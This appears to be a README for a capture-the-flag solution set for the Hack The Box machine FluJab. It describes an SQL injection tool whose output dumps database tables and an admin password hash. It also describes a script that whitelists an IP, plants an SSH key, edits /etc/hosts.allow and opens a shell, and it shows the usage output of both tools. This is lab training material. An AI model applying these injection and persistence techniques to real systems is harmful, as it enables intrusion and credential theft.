## Challenge

[FluJab](https://www.hackthebox.eu/home/machines/profile/171) from Hackthebox.eu

## Reference

Originally published in blog posts:
- https://0xdf.gitlab.io/2019/06/15/htb-flujab.html

## SQL Injection

### Description

Performs SQL Injection in the cancelation path on the freeflujab site, receiving the injection results in an email over an SMTP thread.

### Usage

```
> dump_tables vaccinations 100
vaccinations:admin
vaccinations:admin_attribute
...[snip]...
> dump_columns vaccinations admin 100    
admin:id           
admin:loginname                            
admin:namelc                             
admin:email                                                     
admin:access                                    
admin:created
admin:modified
admin:modifiedby
admin:password
admin:passwordchanged
admin:superuser
admin:disabled
admin:privileges

> dump_data vaccinations.admin loginname:access:password 2
sysadm:sysadmin-console-01.flujab.htb:a3e30cce47580888f1f185798aca22ff10be617f4a982d67643bb56448508602
```

## Shell as sysadm

### Description

bash script to add my IP to the whitelist, then access Ajenti. From there it will upload an public ssh key, and add my ip to the TCP Wrapper whitelist. Finally, it will connect over ssh to the host.

### Usage

```
root@kali# ./flujab_sysadm_shell.sh
[+] Added 10.10.14.8 to whitelist
[*] Will log into Ajenti
[*] Can take up to two minutes for whitelist to propegate
[+] Got session cookie: 33d4c8061ff0f43b4fba06611f5dd84c7dfcd975
[+] Added 10.10.14.8 to /etc/hosts.allow
[+] Uploaded private key to /home/sysadm/access
[+] AuthorizedKeyFile changed to 600
sysadm@flujab:~$
```
